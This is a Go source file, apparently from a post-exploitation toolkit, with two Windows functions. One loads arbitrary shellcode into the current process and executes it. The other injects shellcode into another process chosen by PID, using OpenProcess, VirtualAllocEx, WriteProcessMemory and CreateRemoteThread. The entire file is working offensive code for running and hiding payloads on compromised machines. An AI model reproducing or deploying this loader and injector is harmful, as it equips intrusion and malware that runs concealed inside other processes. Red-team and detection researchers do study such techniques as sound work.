// +build windows

package postex
//Contains functions for loading and executing shellcode.

import "syscall"
import "unsafe"

// Spawn a new process and load some shellcode into it.

func ShellcodeWindows(sc []byte) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_READWRITE = 0x04
	const PAGE_EXECUTE_READ = 0x20
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldperms uint32
	VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldperms)))
	syscall.Syscall(addr, 0, 0, 0, 0)

	return nil
}

// Inject shellcode into an existing process.

func ShellcodeInjectWindows(sc []byte, pid int) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

	const PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_READWRITE = 0x04
	const PAGE_EXECUTE_READ = 0x20
	proc_handle, _, _ := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	remote_buf, _, _ := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	WriteProcessMemory.Call(proc_handle, remote_buf, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
	var oldperms uint32
	VirtualProtectEx.Call(proc_handle, remote_buf, uintptr(len(sc)), PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldperms)));
	CreateRemoteThread.Call(proc_handle, 0, 0, remote_buf, 0, 0, 0)
			
	return nil
}

